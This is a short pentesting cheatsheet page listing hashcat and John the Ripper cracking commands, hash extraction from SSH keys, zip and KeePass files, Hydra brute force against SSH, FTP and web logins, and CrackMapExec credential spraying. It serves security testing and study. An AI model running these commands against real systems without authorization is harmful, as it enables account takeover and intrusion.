---
title: "Password Cracking - Hashcat & John Cheatsheet"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "Cheatsheet: Password Cracking - Hashcat & John Cheatsheet"
summary: "PasswordAttacks | Password Cracking - Hashcat & John Cheatsheet"
tags:
  - "Password Cracking"
  - "Brute Force"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "PasswordAttacks"
ShowToc: true
TocOpen: false

cover:
  image: /images/covers/cheatsheet.svg
  alt: "cheatsheet"
  relative: false
---

## Wordlists
```bash
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/
/usr/share/seclists/Usernames/
```

## Hashcat
```bash
# Identifier le hash
hashid '<hash>'
hash-identifier

# Modes courants
hashcat -m 0 hash.txt rockyou.txt      # MD5
hashcat -m 100 hash.txt rockyou.txt     # SHA1
hashcat -m 1400 hash.txt rockyou.txt    # SHA256
hashcat -m 1800 hash.txt rockyou.txt    # sha512crypt ($6$)
hashcat -m 500 hash.txt rockyou.txt     # md5crypt ($1$)
hashcat -m 3200 hash.txt rockyou.txt    # bcrypt
hashcat -m 1000 hash.txt rockyou.txt    # NTLM
hashcat -m 13100 hash.txt rockyou.txt   # Kerberoast
```

## John the Ripper
```bash
john --wordlist=rockyou.txt hash.txt
john --show hash.txt

# Formats spécifiques
john --format=raw-md5 hash.txt
john --format=raw-sha256 hash.txt

# Extraire hash
ssh2john id_rsa > hash.txt
zip2john file.zip > hash.txt
keepass2john db.kdbx > hash.txt
```

## Hydra (Bruteforce online)
```bash
hydra -l <user> -P rockyou.txt <IP> ssh
hydra -l <user> -P rockyou.txt <IP> ftp
hydra -l admin -P rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

## CrackMapExec
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
crackmapexec ssh <IP> -u users.txt -p passwords.txt
```
